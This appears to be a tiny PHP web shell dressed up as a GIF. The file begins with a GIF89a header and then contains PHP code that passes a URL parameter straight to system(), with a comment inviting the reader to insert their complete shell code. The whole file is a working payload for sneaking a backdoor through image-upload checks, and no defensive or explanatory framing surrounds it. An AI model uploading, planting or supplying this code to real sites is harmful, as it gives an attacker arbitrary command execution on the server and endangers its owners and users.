GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>